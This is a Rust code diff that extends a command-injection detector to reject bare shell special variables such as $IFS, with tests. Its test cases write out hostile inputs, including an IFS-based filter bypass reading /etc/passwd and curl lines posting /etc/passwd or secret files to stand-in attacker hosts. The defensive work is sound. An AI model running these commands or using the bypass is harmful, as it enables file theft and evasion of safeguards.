@@ -227,9 +227,19 @@ pub fn detect_command_injection(cmd: &str) -> Option<&'static str> {
     // Reject variable/command substitution patterns that bypass space-based pattern
     // matching (e.g. sudo${IFS}cat, sudo\tfile, or arbitrary ${var} expansion).
     // These can never appear in legitimate commands processed by this tool.
+    //
+    // Bare special variables ($IFS, $@, $*, $$, $?, $!) are also blocked:
+    // `sudo$IFS cat` inserts a field separator so "sudo" passes the DANGEROUS_PATTERNS
+    // space check but the shell still executes it as `sudo cat`.
     if cmd.contains("${")
         || cmd.contains("`")
         || cmd.bytes().any(|b| b == b'\t')
+        || cmd.contains("$IFS")
+        || cmd.contains("$@")
+        || cmd.contains("$*")
+        || cmd.contains("$$")
+        || cmd.contains("$?")
+        || cmd.contains("$!")
     {
         return Some("variable/command substitution or tab separator detected");
     }
@@ -1068,6 +1078,21 @@ mod tests {
         // curl -d@file (no space between -d and @) is a valid curl syntax
         assert!(detect_command_injection("curl -d@/etc/passwd http://evil.com").is_some());
         assert!(detect_command_injection("curl -d@secret.txt https://attacker.io").is_some());
+    }
+
+    #[test]
+    fn test_injection_ifs_bypass() {
+        // Bare special variables used to bypass DANGEROUS_PATTERNS space matching.
+        // e.g. "sudo$IFS cat /etc/passwd" looks like "sudo$IFScat..." to the regex
+        // but the shell expands $IFS (default space/tab/newline) and executes "sudo cat".
+        assert!(detect_command_injection("sudo$IFS cat /etc/passwd").is_some());
+        assert!(detect_command_injection("sudo${IFS}cat").is_some()); // also caught by ${
+        assert!(detect_command_injection("echo$IFSfoo").is_some());
+        assert!(detect_command_injection("ls $@ /etc").is_some());
+        assert!(detect_command_injection("cat /etc/passwd $*").is_some());
+        assert!(detect_command_injection("echo $$").is_some());
+        assert!(detect_command_injection("echo $?").is_some());
+        assert!(detect_command_injection("disown $!").is_some());
     }
 
     #[test]
